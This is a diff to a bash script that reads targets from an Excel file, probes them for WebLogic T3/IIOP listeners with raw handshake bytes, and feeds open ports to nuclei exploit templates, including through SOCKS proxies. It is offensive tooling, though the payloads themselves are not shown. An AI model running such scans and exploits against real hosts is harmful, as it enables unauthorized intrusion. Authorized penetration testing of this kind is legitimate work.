@@ -29,6 +29,18 @@ DRY_RUN=false
 PROXY=""
 SOCKS=""
 SOCKS_AUTH=""
+# WebLogic T3/IIOP listen ports to probe when the URL carries no explicit
+# WebLogic port (i.e. the URL is on a web port 80/443, typically reverse-proxied).
+# T3/IIOP never run on 80/443; the default listen port is 7001 (7002 = SSL,
+# which a plaintext probe cannot detect). Override with --t3-ports 7001,7005.
+T3_PORTS="7001"
+# WebLogic SSL listen ports probed for T3/IIOP over TLS via `ncat --ssl`.
+# Detect-only: reported as T3-ssl/IIOP-ssl (the plaintext nuclei templates
+# cannot deliver over TLS). Override with --t3-ssl-ports, or set empty to skip.
+T3_SSL_PORTS="7002"
+# Python interpreter used for the Excel read/write phases; must have openpyxl.
+# Override if `python3` on PATH lacks it, e.g. PYTHON=/path/to/python3 ./scan...
+PYTHON="${PYTHON:-python3}"
 
 while [[ $# -gt 0 ]]; do
   case "$1" in
@@ -39,6 +51,9 @@ while [[ $# -gt 0 ]]; do
     --proxy)     PROXY="$2"; shift 2 ;;
     --socks)     SOCKS="$2"; shift 2 ;;
     --socks-auth) SOCKS_AUTH="$2"; shift 2 ;;
+    --t3-ports)  T3_PORTS="$2"; shift 2 ;;
+    --t3-ssl-ports) T3_SSL_PORTS="$2"; shift 2 ;;
+    --excel)     EXCEL="$2"; shift 2 ;;
     *)           echo "Unknown option: $1"; exit 1 ;;
   esac
 done
@@ -118,7 +133,7 @@ IIOP_TEMPLATES=(
 
 # ─── Phase 0: extract targets from Excel ─────────────────────────────────────
 TARGETS_FILE="$WORK_DIR/targets.txt"
-python3 - "$EXCEL" "$ROW_START" "$ROW_END" "$TARGETS_FILE" <<'PYEXTRACT'
+"$PYTHON" - "$EXCEL" "$ROW_START" "$ROW_END" "$TARGETS_FILE" <<'PYEXTRACT'
 import sys, openpyxl
 excel, rs, re, out = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), sys.argv[4]
 wb = openpyxl.load_workbook(excel, read_only=True)
@@ -234,32 +249,90 @@ scan_surface() {
     done
   fi
 
-  # ── T3 probe: send T3 handshake, look for HELO ──
+  # ── T3 / IIOP probe (raw TCP) ──
+  # T3/IIOP never listen on web ports (80/443): the HTTP URL port is for HTTP
+  # only. For T3/IIOP we probe the real WebLogic listen port -> the URL's
+  # explicit port when it is non-web (e.g. :7001, :8081), otherwise the
+  # --t3-ports candidates (default 7001). Probing :443 for T3 is meaningless
+  # (TLS front of a reverse proxy) and would false-negative away an open 7001.
+  # The nuclei T3/IIOP templates are pinned to this same port in Phase 2.
   local nc_cmd="nc -w 5"
   if [[ -n "$SOCKS" ]]; then
     nc_cmd="ncat -w 5 --proxy-type socks5 --proxy $SOCKS"
     [[ -n "$SOCKS_AUTH" ]] && nc_cmd="$nc_cmd --proxy-auth $SOCKS_AUTH"
   fi
 
-  if echo -ne "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://x:7001\n\n" | \
-     timeout "$TIMEOUT" $nc_cmd "$host" "$port" 2>/dev/null | grep -qai "HELO"; then
-    [[ -n "$surfaces" ]] && surfaces="${surfaces},T3" || surfaces="T3"
+  # SSL-wrapped variant (WebLogic SSL listen port, default 7002) via ncat --ssl.
+  # Used only for surface detection: the nuclei T3/IIOP templates speak plaintext
+  # (net.Open tcp), so an SSL-only surface is reported (T3-ssl/IIOP-ssl) but NOT
+  # auto-exploited here — flag it for manual work (ysoserial t3s / corbaloc:iiops).
+  local ssl_cmd=""
+  if command -v ncat &>/dev/null; then
+    ssl_cmd="ncat --ssl -w 5"
+    if [[ -n "$SOCKS" ]]; then
+      ssl_cmd="ncat --ssl -w 5 --proxy-type socks5 --proxy $SOCKS"
+      [[ -n "$SOCKS_AUTH" ]] && ssl_cmd="$ssl_cmd --proxy-auth $SOCKS_AUTH"
+    fi
   fi
 
-  # ── IIOP probe: send a VALID GIOP 1.2 LocateRequest for object key
-  # "NameService"; an open IIOP listener answers with a GIOP LocateReply.
-  # A bare header elicits no reply (server waits for the body) -> false
-  # negatives, so the full message is required. Verified on WLS 12.2.1.4.
-  local giop_probe='\x47\x49\x4f\x50\x01\x02\x00\x03\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x0b\x4e\x61\x6d\x65\x53\x65\x72\x76\x69\x63\x65'
-  if printf "$giop_probe" | \
-     timeout "$TIMEOUT" $nc_cmd "$host" "$port" 2>/dev/null | grep -qa "GIOP"; then
-    [[ -n "$surfaces" ]] && surfaces="${surfaces},IIOP" || surfaces="IIOP"
+  local url_port=""
+  [[ "$url" =~ ^https?://[^/]+:([0-9]+) ]] && url_port="${BASH_REMATCH[1]}"
+  local -a plain_ports ssl_ports
+  if [[ -n "$url_port" && "$url_port" != "80" && "$url_port" != "443" ]]; then
+    plain_ports=("$url_port"); ssl_ports=("$url_port")  # explicit port: try both
+  else
+    IFS=',' read -ra plain_ports <<< "$T3_PORTS"         # reverse-proxied: defaults
+    IFS=',' read -ra ssl_ports   <<< "$T3_SSL_PORTS"
   fi
+
+  # GIOP 1.2 LocateRequest for object key "NameService"; an open IIOP listener
+  # replies with a GIOP LocateReply. A bare header elicits no reply (server
+  # waits for the body) -> false negatives. Verified on WLS 12.2.1.4.
+  local giop_probe='\x47\x49\x4f\x50\x01\x02\x00\x03\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x0b\x4e\x61\x6d\x65\x53\x65\x72\x76\x69\x63\x65'
+
+  # Probe one port with a given connector command; sets t3_hit / iiop_hit.
+  local wlport="" t3_open="" iiop_open="" t3_ssl="" iiop_ssl="" p t3_hit iiop_hit
+  probe_port() {   # $1=port  $2=connector cmd
+    local pp="$1" conn="$2"
+    t3_hit=""; iiop_hit=""
+    echo -ne "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://x:${pp}\n\n" | \
+      timeout "$TIMEOUT" $conn "$host" "$pp" 2>/dev/null | grep -qai "HELO" && t3_hit=1
+    printf "$giop_probe" | \
+      timeout "$TIMEOUT" $conn "$host" "$pp" 2>/dev/null | grep -qa "GIOP" && iiop_hit=1
+    return 0
+  }
+
+  # 1) plaintext (templates can exploit these)
+  for p in "${plain_ports[@]}"; do
+    p="${p// /}"; [[ -z "$p" ]] && continue
+    probe_port "$p" "$nc_cmd"
+    [[ -n "$t3_hit" ]] && t3_open=1
+    [[ -n "$iiop_hit" ]] && iiop_open=1
+    if [[ -n "$t3_open$iiop_open" ]]; then wlport="$p"; break; fi
+  done
+
+  # 2) SSL — only if nothing plaintext found and ncat is available (detect-only)
+  if [[ -z "$t3_open$iiop_open" && -n "$ssl_cmd" ]]; then
+    for p in "${ssl_ports[@]}"; do
+      p="${p// /}"; [[ -z "$p" ]] && continue
+      probe_port "$p" "$ssl_cmd"
+      [[ -n "$t3_hit" ]] && t3_ssl=1
+      [[ -n "$iiop_hit" ]] && iiop_ssl=1
+      if [[ -n "$t3_ssl$iiop_ssl" ]]; then break; fi
+    done
+  fi
+
+  [[ -n "$t3_open"   ]] && surfaces="${surfaces:+$surfaces,}T3"
+  [[ -n "$iiop_open" ]] && surfaces="${surfaces:+$surfaces,}IIOP"
+  [[ -n "$t3_ssl"    ]] && surfaces="${surfaces:+$surfaces,}T3-ssl"
+  [[ -n "$iiop_ssl"  ]] && surfaces="${surfaces:+$surfaces,}IIOP-ssl"
 
   [[ -z "$surfaces" ]] && surfaces="NONE"
 
   echo "$surfaces" > "$result_file"
-  echo "  [row $row] $host:$port -> $surfaces"
+  # Pin the plaintext WebLogic port for Phase 2 templates (falls back to first).
+  echo "${wlport:-${plain_ports[0]}}" > "$SURFACE_DIR/row${row}.wlport"
+  echo "  [row $row] $host (http:$port wl:${wlport:-none}) -> $surfaces"
 }
 
 while IFS=$'\t' read -r row url <&3; do
@@ -279,6 +352,12 @@ run_nuclei_for_target() {
   local surfaces
   surfaces=$(cat "$surface_file" 2>/dev/null || echo "NONE")
 
+  # WebLogic listen port discovered in Phase 1 (for T3/IIOP templates), and the
+  # bare host (T3/IIOP must target host:wlport, not the HTTP URL / :443).
+  local wlport host_only
+  wlport=$(cat "$SURFACE_DIR/row${row}.wlport" 2>/dev/null || echo 7001)
+  host_only=$(echo "$url" | sed -E 's|^https?://||;s|[:/].*||')
+
   local templates=()
   local result_file="$RESULTS_DIR/row${row}.json"
 
@@ -288,22 +367,26 @@ run_nuclei_for_target() {
     return
   fi
 
-  # HTTP templates: only if Console exposed
+  # Exact comma-token match so "T3" does NOT also match the SSL token "T3-ssl"
+  # (templates speak plaintext; SSL surfaces are report-only, handled in Phase 1).
+  has_surface() { case ",$surfaces," in *",$1,"*) return 0 ;; *) return 1 ;; esac; }
+
+  # HTTP templates: any console surface (HTTP / HTTP-restricted / HTTP-bypass)
   if echo "$surfaces" | grep -q "HTTP"; then
     for t in "${HTTP_TEMPLATES[@]}"; do
       [[ -f "$t" ]] && templates+=("-t" "$t")
     done
   fi
 
-  # T3 templates: only if T3 open
-  if echo "$surfaces" | grep -q "T3"; then
+  # T3 templates: only plaintext T3 open
+  if has_surface T3; then
     for t in "${T3_TEMPLATES[@]}"; do
       [[ -f "$t" ]] && templates+=("-t" "$t")
     done
   fi
 
-  # IIOP templates: need T3 (version probe) + IIOP (delivery)
-  if echo "$surfaces" | grep -q "T3" && echo "$surfaces" | grep -q "IIOP"; then
+  # IIOP templates: need plaintext T3 (version probe) + plaintext IIOP (delivery)
+  if has_surface T3 && has_surface IIOP; then
     for t in "${IIOP_TEMPLATES[@]}"; do
       [[ -f "$t" ]] && templates+=("-t" "$t")
     done
@@ -356,14 +439,39 @@ run_nuclei_for_target() {
       </dev/null 2>/dev/null || true
   fi
 
-  # T3/IIOP templates through SOCKS via proxychains4
+  # T3/IIOP templates through SOCKS via proxychains4.
+  # Target the real WebLogic listen port (host:wlport), NOT the HTTP URL/:443.
   if [[ ${#raw_tpls[@]} -gt 0 ]]; then
     local nuclei_wrap=""
     if [[ -n "$SOCKS" && -f "${PROXYCHAINS_CONF:-/dev/null}" ]] && command -v proxychains4 &>/dev/null; then
       nuclei_wrap="proxychains4 -q -f $PROXYCHAINS_CONF"
     fi
-    $nuclei_wrap nuclei -u "$url" \
-      "${raw_tpls[@]}" \
+
+    # The templates pin `Port: "7001"` internally (they ignore the URL port).
+    # If the detected port differs, run sed-patched copies so the payload hits
+    # the right port instead of always 7001.
+    local -a raw_run=("${raw_tpls[@]}")
+    if [[ "$wlport" != "7001" ]]; then
+      local tpl_dir="$WORK_DIR/tpl-$wlport"
+      mkdir -p "$tpl_dir"
+      raw_run=()
+      local j=0
+      while [[ $j -lt ${#raw_tpls[@]} ]]; do
+        if [[ "${raw_tpls[$j]}" == "-t" ]]; then
+          local src="${raw_tpls[$((j+1))]}" base dst
+          base=$(basename "$src")
+          dst="$tpl_dir/$base"
+          [[ -f "$dst" ]] || sed 's/Port: "7001"/Port: "'"$wlport"'"/' "$src" > "$dst"
+          raw_run+=("-t" "$dst")
+          j=$((j+2))
+        else
+          j=$((j+1))
+        fi
+      done
+    fi
+
+    $nuclei_wrap nuclei -u "$host_only" \
+      "${raw_run[@]}" \
       -timeout "$TIMEOUT" \
       -rate-limit "$RATE_LIMIT" \
       -no-color -jsonl -silent \
